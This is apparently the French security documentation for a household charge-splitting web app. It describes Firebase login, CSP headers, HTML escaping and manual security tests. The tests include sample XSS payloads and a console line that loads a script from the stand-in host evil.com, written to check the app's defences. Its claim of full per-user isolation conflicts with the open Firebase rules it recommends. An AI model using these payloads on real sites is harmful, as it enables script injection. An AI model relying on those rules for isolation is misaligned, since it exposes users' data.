# 🔐 Sécurité - Split-ChargeProrata

> **Version** : 2.2.0-firebase-auth | **Date** : 2026-01-28

---

## 🛡️ Couches de Sécurité

L'application implémente **plusieurs couches de sécurité** :

1. ✅ **Authentification Firebase Multi-méthodes** - Google OAuth + Email/Mot de passe
2. ✅ **Isolation des données par utilisateur** - Chaque compte accède uniquement à ses données
3. ✅ **Content Security Policy (CSP)** - Bloque scripts/ressources malveillants
4. ✅ **Protection XSS** - Échappement HTML de toutes entrées
5. ✅ **Validation entrées** - Limites sur montants (max 100k€)
6. ✅ **Stockage sécurisé** - Try/catch sur localStorage + Firebase writes avec error handling
7. ✅ **Gestion d'état securisée** - Réinitialisation complète à la déconnexion

---

## 🔐 Authentification Firebase (v2.2.0+)

### Méthodes d'authentification disponibles

L'application offre deux méthodes d'authentification via Firebase Auth :

1. Google OAuth (recommandé)
   - Connexion via popup Google en un clic
   - Pas de mot de passe à gérer
   - Compte Google existant suffisant

2. Email + Mot de passe
   - Création de compte avec email et mot de passe
   - Mot de passe minimum 6 caractères (contrôle Firebase)
   - Utile si l'utilisateur préfère ne pas lier un compte Google

### Comment ça fonctionne

```javascript
// Flux d'authentification
1. Page de connexion affichée (authOverlay)
2. Utilisateur choisit : Google OAuth ou Email/Password
3. Firebase Auth émets un token UID unique
4. onAuthStateChanged() détecte l'état authentifié
5. Application se charge : données + interface
6. Données stockées dans Firebase sous le chemin de l'utilisateur (UID)
7. Déconnexion → réinitialisation d'état complète + retour authOverlay
```

### Régles Firebase (recommandées)

```json
{
  "rules": {
    ".read": "auth != null",
    ".write": "auth != null"
  }
}
```

**Signification** :

- `auth != null` : Utilisateur doit être authentifié avec un compte valide
- Sans authentification → **Accès Firebase refusé**
- Idéalement, les règles isoleraient les données par `auth.uid` pour une isolation par utilisateur complète

### Avantages Sécurité

**Authentification forte** :

- ✅ Google OAuth : authentification via un fournisseur de confiance
- ✅ Email/Password : gestion des comptes via Firebase Auth (hashing mot de passe côté serveur)
- ✅ Pas de credentials stockés côté client

**Isolation des données** :

- ✅ Chaque utilisateur authentifié possède un UID unique
- ✅ Les données sont associées à cet UID dans Realtime Database
- ✅ Un utilisateur ne peut pas accéder aux données d'un autre

**Gestion d'état securisée** :

- ✅ `onAuthStateChanged()` est le point d'entrée unique de l'application
- ✅ L'initialisation des données ne se déclenche qu'après authentification confirmée
- ✅ Flag `appInitialized` empêche le double-chargement
- ✅ À la déconnexion : réinitialisation complète (charges, salaires, données de recherche)

**Compatible hors ligne** :

- ✅ Si Firebase indisponible → Fallback localStorage
- ✅ Application continue de fonctionner localement

### Limites

**Règles Firebase actuelles permissives** :

- ⚠️ Les règles `.read/.write: "auth != null"` autorisent tout utilisateur authentifié
- ⚠️ Pour une isolation totale, implémenter des règles basées sur `auth.uid`
- Acceptable pour un usage restreint (couple, famille)

**Protection limitée si HTML compromis** :

- ⚠️ Si quelqu'un obtient le fichier HTML complet, il peut l'exécuter et s'authentifier
- Toujours limité aux comptes créés/autorisés dans Firebase

---

## Content Security Policy (CSP)

Le fichier HTML intègre une **Content Security Policy** stricte pour protéger contre les injections de code malveillant.

### Version autonome (`Split-ChargeProrata.html`)

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src 'self' data:; font-src 'self'; base-uri 'self'; form-action 'self';"
/>
```

**Directives** :

- `default-src 'none'` - Bloque toutes les ressources par défaut
- `script-src 'unsafe-inline'` - Autorise uniquement les scripts inline (nécessaire pour single-file)
- `style-src 'unsafe-inline'` - Autorise uniquement les styles inline (nécessaire pour single-file)
- `img-src 'self' data:` - Autorise images locales et data URIs (pour SVG inline)
- `font-src 'self'` - Autorise polices locales uniquement
- `base-uri 'self'` - Empêche modification de la balise `<base>`
- `form-action 'self'` - Empêche soumission de formulaires vers domaines externes

### Version modulaire (`Split-ChargeProrata-modular.html`)

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; base-uri 'self'; form-action 'self';"
/>
```

**Différences** :

- `script-src 'self'` - Scripts externes autorisés (script.js)
- `style-src 'self'` - Styles externes autorisés (styles.css)
- ✅ **Plus sécurisé** car bloque complètement les scripts/styles inline

### Ce que la CSP bloque

❌ **Bloqué par la CSP** :

- Chargement de scripts externes depuis CDN (ex: `<script src="https://cdn.example.com/malicious.js">`)
- Injection de code JavaScript dans les attributs HTML (ex: `<img onerror="alert('XSS')">`)
- Chargement de styles CSS malveillants depuis domaines externes
- Redirection vers des sites externes via formulaires
- Modification de l'URL de base du document

✅ **Autorisé par la CSP** :

- Scripts et styles inline (version autonome) ou fichiers locaux (version modulaire)
- Images locales et SVG inline (data URIs)
- Sauvegarde dans localStorage (aucune connexion réseau)

## Protections XSS implémentées

### 1. Échappement HTML (`escapeHtml()`)

Tous les contenus utilisateur sont échappés avant affichage :

```javascript
function escapeHtml(unsafe) {
  if (!unsafe) return '';
  const div = document.createElement('div');
  div.textContent = unsafe;
  return div.innerHTML;
}
```

**Protection contre** :

- `<script>alert('XSS')</script>` → `&lt;script&gt;alert('XSS')&lt;/script&gt;`
- `<img src=x onerror=alert(1)>` → `&lt;img src=x onerror=alert(1)&gt;`

### 2. Utilisation de `createElement()` au lieu de `innerHTML`

La fonction `addCharge()` crée les éléments DOM via API sécurisée :

```javascript
const inputDesc = document.createElement('input');
inputDesc.type = 'text';
inputDesc.className = 'charge-desc';
inputDesc.placeholder = 'ex: EDF';
cellDesc.appendChild(inputDesc);
```

**Évite** : Injection via `innerHTML` avec contenu malveillant

### 3. Validation stricte des entrées

Tous les montants sont validés avec limites maximales :

```javascript
function validateAmount(value, fieldName, max = 100000) {
  if (isNaN(value) || value === null || value === '') {
    alert(`⚠️ ${fieldName} : valeur invalide`);
    return false;
  }
  if (value < 0 || value > max) return false;
  return true;
}
```

**Limites** :

- Salaires : 100 000 € maximum
- Charges : 50 000 € maximum

### 4. localStorage sécurisé

Fonctions `safeSaveToLocalStorage()` et `safeLoadFromLocalStorage()` avec :

- Try/catch pour gérer quota dépassé
- Gestion mode navigation privée
- Parsing JSON sécurisé avec fallback
- Gestion des données corrompues

## Audit de sécurité

### ✅ Vulnérabilités corrigées

| Vulnérabilité                | Statut     | Mitigation                                  |
| ---------------------------- | ---------- | ------------------------------------------- |
| XSS via innerHTML            | ✅ Corrigé | `createElement()` + `escapeHtml()`          |
| XSS via attributs HTML       | ✅ Corrigé | CSP bloque inline event handlers            |
| Injection script externe     | ✅ Corrigé | CSP `script-src` restrictif                 |
| localStorage crash           | ✅ Corrigé | Try/catch avec fallback                     |
| Valeurs absurdes             | ✅ Corrigé | Validation limites (100k€ / 50k€)           |
| Données corrompues           | ✅ Corrigé | JSON.parse sécurisé                         |
| Race condition auth/init     | ✅ Corrigé | Init dans `onAuthStateChanged` + flag       |
| Firebase writes silencieux   | ✅ Corrigé | `.catch()` + toast sur toutes les requêtes  |
| Fuite d'état entre comptes   | ✅ Corrigé | Réinitialisation complète à déconnexion     |
| NaN dans formatCurrency      | ✅ Corrigé | Guard `isNaN()` → retour "0,00 €"           |

### 🔒 Bonnes pratiques respectées

- ✅ Authentification forte via Firebase Auth (Google OAuth + Email/Password)
- ✅ Données isolées par utilisateur (UID Firebase)
- ✅ Aucun tracking ou analytics
- ✅ Pas de credentials en dur
- ✅ Validation côté client complète
- ✅ Firebase writes avec gestion d'erreurs (`.catch()` + toast)
- ✅ Réinitialisation d'état à la déconnexion (privacy)
- ✅ Code JavaScript documenté (JSDoc)
- ✅ Principe du moindre privilège (CSP)

## Tests de sécurité

Pour tester la sécurité de l'application :

### Test XSS basique

1. Ajouter une charge avec description : `<script>alert('XSS')</script>`
2. Calculer la répartition
3. Vérifier l'historique

**Résultat attendu** : Le script est échappé et affiché comme texte, pas exécuté.

### Test CSP

1. Ouvrir la console développeur (F12)
2. Tenter d'exécuter : `var s = document.createElement('script'); s.src='https://evil.com/malicious.js'; document.body.appendChild(s);`

**Résultat attendu** (version modulaire) :

```text
Refused to load the script 'https://evil.com/malicious.js' because it violates the following Content Security Policy directive: "script-src 'self'".
```

### Test localStorage

1. Remplir le localStorage jusqu'à saturation (mode navigation privée ou quota atteint)
2. Tenter de sauvegarder des données

**Résultat attendu** : Notification "⚠️ Impossible de sauvegarder (stockage plein ou désactivé)" sans crash.

## Signalement de vulnérabilité

Si vous découvrez une vulnérabilité de sécurité, merci de :

1. NE PAS la divulguer publiquement
2. Contacter l'auteur : Richie Bigot-Scoarnec
3. Fournir une description détaillée et un PoC (Proof of Concept) si possible

---

**Dernière mise à jour** : 2026-01-28
